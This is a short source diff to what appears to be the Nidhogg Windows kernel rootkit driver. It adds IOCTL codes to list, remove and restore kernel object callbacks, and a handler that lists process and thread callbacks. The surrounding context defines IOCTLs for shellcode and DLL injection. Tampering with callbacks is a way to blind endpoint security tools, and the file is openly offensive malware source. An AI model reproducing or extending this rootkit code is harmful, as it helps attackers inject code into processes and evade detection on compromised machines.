@@ -31,6 +31,10 @@
 #define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_LIST_CALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1113,6 +1117,35 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));
 
 		len += sizeof(DllInformation);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_LIST_CALLBACKS: 
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		if (size % sizeof(CallbacksList) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (CallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		switch (data->Type) {
+		case ObProcessType:
+		case ObThreadType: {
+			status = ListObCallbacks(data);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
+		}
+
+		len += sizeof(CallbacksList);
 		break;
 	}
 
